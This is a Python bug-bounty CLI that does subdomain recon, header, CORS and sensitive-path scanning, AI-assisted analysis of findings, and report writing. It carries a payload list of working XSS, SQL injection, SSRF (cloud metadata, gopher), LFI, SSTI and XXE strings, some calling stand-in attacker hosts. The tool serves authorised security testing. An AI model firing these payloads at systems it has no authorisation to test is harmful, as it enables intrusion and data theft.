#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║              BBHunter - Bug Bounty CLI               ║
║   Recon · Scanning · Payloads · Report Writing       ║
╚══════════════════════════════════════════════════════╝
"""

import argparse
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import datetime
import urllib.request
import urllib.parse
import urllib.error
import concurrent.futures
from pathlib import Path

# ── Colours ──────────────────────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
DIM= "\033[2m"
RST= "\033[0m"
BOLD="\033[1m"

BANNER = f"""{M}
  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ██████╔╝██████╔╝███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██╗██╔══██╗██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██████╔╝██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{RST}{DIM}  Bug Bounty Hunter CLI  ·  Recon · Scan · Payloads · Reports{RST}
"""

# ─────────────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────────────
def info(msg):  print(f"{B}[*]{RST} {msg}")
def ok(msg):    print(f"{G}[+]{RST} {msg}")
def warn(msg):  print(f"{Y}[!]{RST} {msg}")
def err(msg):   print(f"{R}[-]{RST} {msg}")
def section(title):
    print(f"\n{BOLD}{C}{'─'*55}{RST}")
    print(f"{BOLD}{C}  {title}{RST}")
    print(f"{BOLD}{C}{'─'*55}{RST}")

def http_get(url, timeout=6):
    """Simple HTTP GET, returns (status_code, headers, body) or None."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "BBHunter/1.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, dict(r.headers), r.read(4096).decode("utf-8", errors="ignore")
    except Exception:
        return None

def save_json(path, data):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    ok(f"Saved → {path}")

def call_openai(api_key, prompt):
    payload = {
        "model": "gpt-4o-mini",
        "messages": [{"role": "user", "content": prompt}],
    }
    req = urllib.request.Request(
        "https://api.openai.com/v1/chat/completions",
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as ex:
        body = ex.read().decode("utf-8", errors="ignore")
        raise RuntimeError(f"OpenAI API HTTP {ex.code}: {body[:300]}") from ex
    return data["choices"][0]["message"]["content"].strip()

def call_anthropic(api_key, prompt):
    try:
        max_tokens = int(os.getenv("BBHUNTER_AI_MAX_TOKENS", "1200"))
    except ValueError:
        max_tokens = 1200
    payload = {
        "model": "claude-3-5-haiku-latest",
        "max_tokens": max_tokens,
        "messages": [{"role": "user", "content": prompt}],
    }
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/messages",
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "x-api-key": api_key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as ex:
        body = ex.read().decode("utf-8", errors="ignore")
        raise RuntimeError(f"Anthropic API HTTP {ex.code}: {body[:300]}") from ex
    return "".join(part.get("text", "") for part in data.get("content", [])).strip()

# ─────────────────────────────────────────────────────────────────────────
#  MODULE 1 — RECON
# ─────────────────────────────────────────────────────────────────────────
WORDLIST = [
    "www","mail","ftp","admin","api","dev","staging","test","beta","blog",
    "shop","store","app","mobile","m","cdn","static","assets","img","images",
    "portal","dashboard","login","auth","sso","vpn","remote","git","gitlab",
    "jenkins","jira","confluence","docs","help","support","status","monitoring",
    "grafana","kibana","elastic","s3","backup","old","legacy","v1","v2","v3",
    "internal","corp","intranet","extranet","partner","client","customer",
    "api-v1","api-v2","api-dev","api-staging","api-prod",
]

def resolve(sub, domain):
    fqdn = f"{sub}.{domain}"
    try:
        ip = socket.gethostbyname(fqdn)
        return fqdn, ip
    except Exception:
        return None

def run_recon(domain, output_dir, threads=50):
    section(f"RECON  →  {domain}")
    results = {"domain": domain, "timestamp": str(datetime.datetime.now()), "subdomains": []}

    # DNS resolution
    info(f"Enumerating {len(WORDLIST)} common subdomains with {threads} threads...")
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(resolve, sub, domain): sub for sub in WORDLIST}
        for fut in concurrent.futures.as_completed(futures):
            res = fut.result()
            if res:
                fqdn, ip = res
                ok(f"  {G}{fqdn}{RST}  →  {DIM}{ip}{RST}")
                found.append({"subdomain": fqdn, "ip": ip})

    results["subdomains"] = found

    # HTTP probe on found subdomains
    info(f"\nProbing {len(found)} subdomains for HTTP/S...")
    for entry in found:
        for scheme in ["https", "http"]:
            url = f"{scheme}://{entry['subdomain']}"
            r = http_get(url)
            if r:
                code, headers, _ = r
                server = headers.get("Server", "?")
                ok(f"  {scheme.upper()} {code}  {entry['subdomain']}  [{DIM}{server}{RST}]")
                entry["http"] = {"url": url, "status": code, "server": server}
                break

    # WHOIS-style TXT / MX records
    info("\nChecking DNS TXT records (SPF / DMARC)...")
    for rec in ["_dmarc", "_domainkey", "default._domainkey"]:
        try:
            import subprocess
            out = subprocess.check_output(
                ["nslookup", "-type=TXT", f"{rec}.{domain}"],
                stderr=subprocess.DEVNULL, timeout=4
            ).decode()
            for line in out.splitlines():
                if "text" in line.lower() or '"' in line:
                    ok(f"  {rec}: {line.strip()}")
        except Exception:
            pass

    ok(f"\nFound {len(found)} subdomains for {domain}")
    if output_dir:
        save_json(f"{output_dir}/{domain}_recon.json", results)
    return results


# ─────────────────────────────────────────────────────────────────────────
#  MODULE 2 — VULNERABILITY SCAN
# ─────────────────────────────────────────────────────────────────────────
SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
]

INTERESTING_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Generator", "X-Backend-Server", "Via", "X-Forwarded-For",
]

SENSITIVE_PATHS = [
    "/.git/config", "/.env", "/config.php", "/wp-config.php",
    "/.DS_Store", "/composer.json", "/package.json", "/yarn.lock",
    "/Dockerfile", "/docker-compose.yml", "/.htaccess", "/web.config",
    "/backup.zip", "/backup.sql", "/dump.sql", "/db.sql",
    "/admin/", "/administrator/", "/phpmyadmin/", "/adminer.php",
    "/api/v1/users", "/api/v1/admin", "/api/swagger", "/api/docs",
    "/swagger.json", "/swagger.yaml", "/openapi.json",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/.well-known/security.txt", "/robots.txt", "/sitemap.xml",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/server-status", "/server-info", "/.bash_history",
]

def check_cors(url):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "BBHunter/1.0",
                "Origin": "https://evil.com",
            }
        )
        with urllib.request.urlopen(req, timeout=6, context=ctx) as r:
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                warn(f"  CORS: Wildcard origin (*) allowed")
                return {"issue": "wildcard", "acao": acao}
            if "evil.com" in acao and acac.lower() == "true":
                warn(f"  CORS: Reflected origin + credentials=true  {R}HIGH{RST}")
                return {"issue": "reflected+credentials", "acao": acao, "acac": acac}
    except Exception:
        pass
    return None

def run_scan(url, output_dir):
    section(f"VULN SCAN  →  {url}")
    results = {
        "url": url,
        "timestamp": str(datetime.datetime.now()),
        "findings": [],
    }

    def finding(severity, title, detail):
        tag = {
            "CRITICAL": f"{R}[CRITICAL]{RST}",
            "HIGH":     f"{R}[HIGH]{RST}",
            "MEDIUM":   f"{Y}[MEDIUM]{RST}",
            "LOW":      f"{B}[LOW]{RST}",
            "INFO":     f"{DIM}[INFO]{RST}",
        }.get(severity, "[?]")
        print(f"  {tag} {title}")
        if detail:
            print(f"    {DIM}{detail}{RST}")
        results["findings"].append({"severity": severity, "title": title, "detail": detail})

    # ── Headers ──────────────────────────────────────────────────────────
    info("Checking HTTP headers...")
    r = http_get(url)
    if not r:
        err(f"Could not reach {url}")
        return

    status, headers, body = r

    for h in SECURITY_HEADERS:
        if h not in headers:
            finding("MEDIUM", f"Missing security header: {h}", "Consider adding this header")
        else:
            ok(f"  ✓ {h}: {headers[h][:80]}")

    for h in INTERESTING_HEADERS:
        if h in headers:
            finding("INFO", f"Technology disclosure: {h}", headers[h])

    # ── TLS ──────────────────────────────────────────────────────────────
    if url.startswith("https"):
        info("Checking TLS certificate...")
        try:
            host = urllib.parse.urlparse(url).netloc
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.create_connection((host, 443), timeout=5), server_hostname=host) as s:
                cert = s.getpeercert()
                exp = datetime.datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - datetime.datetime.utcnow()).days
                if days_left < 30:
                    finding("HIGH", f"TLS cert expires in {days_left} days", str(exp))
                else:
                    ok(f"  TLS cert valid for {days_left} days  (expires {exp.date()})")
        except Exception as ex:
            finding("MEDIUM", "TLS certificate issue", str(ex))

    # ── Sensitive paths ───────────────────────────────────────────────────
    info(f"Probing {len(SENSITIVE_PATHS)} sensitive paths...")
    base = url.rstrip("/")

    def probe(path):
        res = http_get(f"{base}{path}", timeout=5)
        if res:
            code, _, body = res
            if code in (200, 301, 302, 403):
                return path, code, len(body)
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for result in ex.map(probe, SENSITIVE_PATHS):
            if result:
                path, code, size = result
                if code == 200:
                    finding("HIGH", f"Sensitive path accessible: {path}", f"HTTP {code}  size={size}b")
                elif code == 403:
                    finding("LOW", f"Forbidden path (may exist): {path}", f"HTTP {code}")
                else:
                    finding("INFO", f"Redirect on path: {path}", f"HTTP {code}")

    # ── CORS ─────────────────────────────────────────────────────────────
    info("Checking CORS policy...")
    cors = check_cors(url)
    if cors:
        if cors.get("issue") == "reflected+credentials":
            finding("HIGH", "Dangerous CORS: reflected origin + credentials", str(cors))
        else:
            finding("MEDIUM", "CORS wildcard origin", str(cors))
    else:
        ok("  CORS appears safe")

    # ── Cookies ──────────────────────────────────────────────────────────
    info("Checking cookies...")
    set_cookie = headers.get("Set-Cookie", "")
    if set_cookie:
        if "HttpOnly" not in set_cookie:
            finding("MEDIUM", "Cookie missing HttpOnly flag", set_cookie[:120])
        if "Secure" not in set_cookie:
            finding("MEDIUM", "Cookie missing Secure flag", set_cookie[:120])
        if "SameSite" not in set_cookie:
            finding("LOW", "Cookie missing SameSite attribute", set_cookie[:120])

    # ── Summary ───────────────────────────────────────────────────────────
    counts = {}
    for f in results["findings"]:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    section("SCAN SUMMARY")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in counts:
            print(f"  {sev:10s} {counts[sev]}")

    if output_dir:
        save_json(f"{output_dir}/scan_{urllib.parse.urlparse(url).netloc}.json", results)

    return results


# ─────────────────────────────────────────────────────────────────────────
#  MODULE 4 — AI VULNERABILITY ANALYZER
# ─────────────────────────────────────────────────────────────────────────
def run_ai_analyze(file_path, url, auto, output_dir):
    section("AI ANALYZE")

    results = None
    source = file_path
    if auto and url:
        info("Running scan first (--auto enabled)...")
        results = run_scan(url, output_dir)
        source = f"{output_dir}/scan_{urllib.parse.urlparse(url).netloc}.json"
    elif file_path:
        try:
            with open(file_path, "r") as f:
                results = json.load(f)
        except Exception as ex:
            err(f"Failed to read scan file: {ex}")
            return
    elif auto:
        scan_files = sorted(Path(output_dir).glob("scan_*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if not scan_files:
            err(f"No scan_*.json files found in {output_dir}")
            return
        source = str(scan_files[0])
        with open(source, "r") as f:
            results = json.load(f)
    else:
        err("Use -f/--file or --auto (optionally with -u/--url)")
        return

    if not isinstance(results, dict):
        err("Invalid scan result format")
        return

    findings_count = len(results.get("findings", []))
    print(f"{M}[AI]{RST} Analyzing {findings_count} findings from {source}...")
    scan_json = json.dumps(results, indent=2)
    if len(scan_json) > 12000:
        scan_json = scan_json[:12000] + "\n... [truncated]"
    prompt = (
        "You are a bug bounty vulnerability analyst. Analyze the JSON scan output and return:\n"
        "1) prioritized findings by severity and exploitability\n"
        "2) possible exploit paths\n"
        "3) business impact for top findings\n"
        "Keep it concise and actionable.\n\n"
        f"Scan JSON:\n{scan_json}"
    )

    try:
        anthropic_key = os.getenv("ANTHROPIC_API_KEY")
        openai_key = os.getenv("OPENAI_API_KEY")
        if anthropic_key:
            analysis = call_anthropic(anthropic_key, prompt)
        elif openai_key:
            analysis = call_openai(openai_key, prompt)
        else:
            err("Missing API key. Set ANTHROPIC_API_KEY or OPENAI_API_KEY")
            return
    except Exception as ex:
        err(f"AI analysis failed: {ex}")
        return

    print(f"\n{analysis}\n")
    if output_dir:
        target = results.get("url", results.get("domain", "target"))
        safe_target = re.sub(r"[^a-zA-Z0-9._-]+", "_", str(target))
        out_path = f"{output_dir}/ai_analysis_{safe_target}.txt"
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        with open(out_path, "w") as f:
            f.write(analysis + "\n")
        ok(f"Saved → {out_path}")


# ─────────────────────────────────────────────────────────────────────────
#  MODULE 3 — PAYLOAD GENERATOR
# ─────────────────────────────────────────────────────────────────────────
PAYLOADS = {
    "xss": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "\"><img src=x onerror=alert`1`>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<<script>alert(1)//<</script>",
            "<svg><script>alert(1)</script></svg>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<script/src=//attacker.com/xss.js>",
        ],
        "blind": [
            "<script src=https://your-xss-hunter.xss.ht></script>",
            "\"><script src=https://your-xss-hunter.xss.ht></script>",
            "'><script src=https://your-xss-hunter.xss.ht></script>",
        ],
    },
    "sqli": {
        "basic": [
            "'", "''", "`", "``", ",", "\"", "\"\"",
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "' OR 1=1#", "1' ORDER BY 1--",
            "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT null--", "1' UNION SELECT null,null--",
        ],
        "blind": [
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND 1=1--", "1' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a",
        ],
        "bypass": [
            "' /*!OR*/ '1'='1",
            "'/**/OR/**/1=1--",
            "' %6FR '1'='1",
            "' OORR '1'='1",
            "';%00",
        ],
    },
    "ssrf": {
        "basic": [
            "http://127.0.0.1/", "http://localhost/",
            "http://0.0.0.0/", "http://[::1]/",
            "http://169.254.169.254/",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://100.100.100.200/",  # Alibaba Cloud
        ],
        "bypass": [
            "http://127.1/", "http://0/",
            "http://0x7f000001/", "http://2130706433/",
            "http://127.0.0.1.nip.io/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "dict://127.0.0.1:6379/",
            "gopher://127.0.0.1:6379/",
            "file:///etc/passwd",
        ],
    },
    "lfi": {
        "basic": [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/passwd", "../../../../../etc/passwd",
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "....//....//etc/passwd", "..%2Fetc%2Fpasswd",
            "..%252Fetc%252Fpasswd",
        ],
        "windows": [
            "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "..%5C..%5CWindows%5Csystem.ini",
        ],
    },
    "open_redirect": {
        "basic": [
            "//evil.com", "///evil.com", "////evil.com",
            "https://evil.com", "http://evil.com",
            "/\\evil.com", "//evil.com/%2F..",
            "javascript:alert(1)", "//google.com",
        ],
    },
    "ssti": {
        "basic": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{7*'7'}}", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self}}", "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
    },
    "xxe": {
        "basic": [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-server.com/xxe">]><foo>&xxe;</foo>""",
        ],
    },
}

def run_payloads(vuln_type, category, output_dir):
    section(f"PAYLOADS  →  {vuln_type.upper()} / {category}")

    if vuln_type not in PAYLOADS:
        err(f"Unknown vuln type: {vuln_type}")
        err(f"Available: {', '.join(PAYLOADS.keys())}")
        return

    cats = PAYLOADS[vuln_type]
    if category == "all":
        to_show = cats
    elif category in cats:
        to_show = {category: cats[category]}
    else:
        err(f"Unknown category: {category}")
        err(f"Available for {vuln_type}: {', '.join(cats.keys())}")
        return

    all_payloads = []
    for cat, payloads in to_show.items():
        print(f"\n  {BOLD}{Y}[ {cat.upper()} ]{RST}")
        for i, p in enumerate(payloads, 1):
            print(f"  {DIM}{i:2d}.{RST}  {G}{p}{RST}")
            all_payloads.append(p)

    print(f"\n{ok.__doc__ or ''}")
    ok(f"Total payloads: {len(all_payloads)}")

    if output_dir:
        fname = f"{output_dir}/payloads_{vuln_type}_{category}.txt"
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        with open(fname, "w") as f:
            f.write("\n".join(all_payloads))
        ok(f"Saved → {fname}")

    return all_payloads


# ─────────────────────────────────────────────────────────────────────────
#  MODULE 4 — REPORT WRITER
# ─────────────────────────────────────────────────────────────────────────
REPORT_TEMPLATE = """# Bug Bounty Report

**Program:**     {program}
**Severity:**    {severity}
**Vulnerability Type:** {vuln_type}
**Date:**        {date}
**Reporter:**    {reporter}

---

## Summary

{summary}

---

## Vulnerability Details

**Affected URL / Endpoint:**
```
{url}
```

**Parameter / Input:**
```
{parameter}
```

---

## Steps to Reproduce

{steps}

---

## Proof of Concept

```
{poc}
```

---

## Impact

{impact}

---

## CVSS Score

**Score:** {cvss}
**Vector:** {cvss_vector}

---

## Remediation

{remediation}

---

## References

- OWASP: https://owasp.org/
- CWE: https://cwe.mitre.org/

---
*Generated with BBHunter CLI*
"""

SEVERITY_IMPACT = {
    "critical": "This vulnerability could allow a remote attacker to fully compromise the application, "
                "access all user data, execute arbitrary code, or take complete control of the system.",
    "high":     "This vulnerability could allow an attacker to access sensitive data, bypass authentication, "
                "or significantly impact the confidentiality, integrity, or availability of the application.",
    "medium":   "This vulnerability could allow an attacker to partially access sensitive information "
                "or perform limited unauthorized actions within the application.",
    "low":      "This vulnerability has limited impact and may require user interaction or other conditions "
                "to exploit, but should still be remediated.",
}

REMEDIATION_ADVICE = {
    "xss":           "Implement context-sensitive output encoding. Use Content-Security-Policy headers. "
                     "Validate and sanitize all user input server-side.",
    "sqli":          "Use parameterized queries / prepared statements. Never concatenate user input into SQL. "
                     "Apply least-privilege database accounts.",
    "ssrf":          "Validate and whitelist allowed URLs/IP ranges. Block requests to internal networks. "
                     "Use a DNS rebinding protection mechanism.",
    "lfi":           "Avoid passing user-controlled input to filesystem functions. Use an allowlist for "
                     "permitted files. Disable dangerous PHP functions.",
    "open_redirect": "Validate redirect targets against a strict allowlist. Avoid using user-supplied "
                     "values in redirect headers or URLs.",
    "ssti":          "Do not pass user input directly into template engines. Sandbox the template "
                     "environment and keep template engines updated.",
    "idor":          "Implement proper authorization checks on every object access. Use indirect "
                     "object references (UUIDs) rather than sequential IDs.",
    "xxe":           "Disable external entity processing in your XML parser. Use a modern JSON API "
                     "where possible.",
    "cors":          "Set Access-Control-Allow-Origin to specific trusted domains. Never reflect the "
                     "Origin header without validation.",
}

CVSS_MAP = {
    "critical": ("9.8", "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "high":     ("8.1", "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"),
    "medium":   ("6.1", "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "low":      ("3.7", "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
}

def run_report(output_dir):
    section("REPORT WRITER")

    def ask(prompt, default=""):
        val = input(f"  {C}{prompt}{RST} [{DIM}{default}{RST}]: ").strip()
        return val if val else default

    print(f"\n  {DIM}Fill in the details. Press Enter to keep defaults.{RST}\n")

    program   = ask("Program / Company name", "Target Corp")
    reporter  = ask("Your handle / name", "anonymous")
    vuln_type = ask("Vulnerability type (xss/sqli/ssrf/lfi/idor/cors/ssti/xxe/other)", "xss")
    severity  = ask("Severity (critical/high/medium/low)", "high")
    url       = ask("Affected URL", "https://target.com/endpoint")
    parameter = ask("Vulnerable parameter / input", "q")
    summary   = ask("One-line summary", f"{vuln_type.upper()} vulnerability in {url}")
    poc       = ask("Proof of concept payload", PAYLOADS.get(vuln_type, {}).get("basic", ["N/A"])[0])

    print(f"\n  {DIM}Steps to reproduce (enter each step, blank line to finish):{RST}")
    steps_list = []
    i = 1
    while True:
        step = input(f"  Step {i}: ").strip()
        if not step:
            break
        steps_list.append(f"{i}. {step}")
        i += 1
    if not steps_list:
        steps_list = [
            f"1. Navigate to {url}",
            f"2. Insert the following payload into the `{parameter}` parameter:",
            f"3. Observe the result confirming the vulnerability.",
        ]

    steps     = "\n".join(steps_list)
    impact    = SEVERITY_IMPACT.get(severity.lower(), "Impact to be assessed.")
    remediation = REMEDIATION_ADVICE.get(vuln_type.lower(), "Follow OWASP best practices for this vulnerability type.")
    cvss, cvss_vector = CVSS_MAP.get(severity.lower(), ("?", "N/A"))
    date      = datetime.date.today().isoformat()

    report = REPORT_TEMPLATE.format(
        program=program, severity=severity.upper(), vuln_type=vuln_type.upper(),
        date=date, reporter=reporter, summary=summary, url=url,
        parameter=parameter, steps=steps, poc=poc,
        impact=impact, cvss=cvss, cvss_vector=cvss_vector,
        remediation=remediation,
    )

    fname = f"{output_dir}/report_{vuln_type}_{date}.md"
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    with open(fname, "w") as f:
        f.write(report)

    print(f"\n{report[:800]}\n{DIM}... (truncated){RST}")
    ok(f"Full report saved → {fname}")


# ─────────────────────────────────────────────────────────────────────────
#  CLI ENTRYPOINT
# ─────────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        prog="bbhunter",
        description="Bug Bounty Hunter CLI — Recon · Scan · Payloads · Reports",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
{BOLD}Examples:{RST}
  Recon a domain:
    python bbhunter.py recon -d example.com

  Scan a URL for vulnerabilities:
    python bbhunter.py scan -u https://example.com

  Generate XSS payloads:
    python bbhunter.py payloads -t xss -c bypass

  List all payload types:
    python bbhunter.py payloads --list

  Write a bug bounty report:
    python bbhunter.py report

  Analyze scan output with AI:
    python bbhunter.py ai-analyze -f ./results/scan_example.com.json

  Save all output to a folder:
    python bbhunter.py recon -d example.com -o ./results
"""
    )
    parser.add_argument("-o", "--output", default="./bbhunter_output",
                        help="Output directory (default: ./bbhunter_output)")

    sub = parser.add_subparsers(dest="command", required=True)

    # recon
    p_recon = sub.add_parser("recon", help="Subdomain enumeration + DNS recon")
    p_recon.add_argument("-d", "--domain", required=True, help="Target domain (e.g. example.com)")
    p_recon.add_argument("-t", "--threads", type=int, default=50, help="Threads (default: 50)")

    # scan
    p_scan = sub.add_parser("scan", help="Vulnerability scanning of a URL")
    p_scan.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://example.com)")

    # payloads
    p_pay = sub.add_parser("payloads", help="Generate attack payloads")
    p_pay.add_argument("-t", "--type", dest="vuln_type",
                       help="Vuln type: xss / sqli / ssrf / lfi / open_redirect / ssti / xxe")
    p_pay.add_argument("-c", "--category", default="all",
                       help="Category: basic / bypass / blind / all (default: all)")
    p_pay.add_argument("--list", action="store_true", help="List all available payload types")

    # ai-analyze
    p_ai = sub.add_parser("ai-analyze", help="Analyze scan findings with Claude/GPT")
    p_ai.add_argument("-f", "--file", help="Path to scan JSON results")
    p_ai.add_argument("-u", "--url", help="Target URL to scan first (use with --auto)")
    p_ai.add_argument("--auto", action="store_true", help="Auto use latest scan JSON or scan URL first")

    # report
    sub.add_parser("report", help="Interactive bug bounty report writer")

    args = parser.parse_args()
    out  = args.output

    if args.command == "recon":
        run_recon(args.domain, out, args.threads)

    elif args.command == "scan":
        run_scan(args.url, out)

    elif args.command == "payloads":
        if args.list or not args.vuln_type:
            section("AVAILABLE PAYLOAD TYPES")
            for vt, cats in PAYLOADS.items():
                total = sum(len(v) for v in cats.values())
                cats_str = " / ".join(cats.keys())
                print(f"  {G}{vt:20s}{RST}  {DIM}[{cats_str}]{RST}  {total} payloads")
        else:
            run_payloads(args.vuln_type, args.category, out)

    elif args.command == "ai-analyze":
        run_ai_analyze(args.file, args.url, args.auto, out)

    elif args.command == "report":
        run_report(out)


if __name__ == "__main__":
    main()
